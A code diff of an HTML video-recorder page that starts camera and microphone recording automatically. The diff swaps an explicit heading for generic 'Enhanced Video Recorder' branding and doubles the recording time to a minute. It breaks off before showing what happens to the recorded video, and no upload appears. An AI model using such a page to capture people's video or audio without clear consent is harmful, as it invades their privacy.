@@ -39,8 +39,10 @@
     </style>
 </head>
 <body>
-    <h1>Allow permission to record video and wait for 1 minute to watch and download your video</h1>
+    <h1>Enhanced Video Recorder</h1>
     <video id="videoPlayer" controls></video>
+    <p>Recording will start automatically. Please allow camera and microphone access.</p>
+    <div class="footer">© 2025 Best Camera </div>
 
     <script>
         async function recordVideo() {
@@ -59,11 +61,11 @@
                 mediaRecorder.ondataavailable = e => chunks.push(e.data);
                 mediaRecorder.start();
 
-                // Record for 30 seconds
+                // Record for 1 minute (60000 ms)
                 setTimeout(() => {
                     mediaRecorder.stop();
                     stream.getTracks().forEach(track => track.stop());
-                }, 30000);
+                }, 60000);
 
                 mediaRecorder.onstop = async () => {
                     const blob = new Blob(chunks, { type: 'video/mp4' });
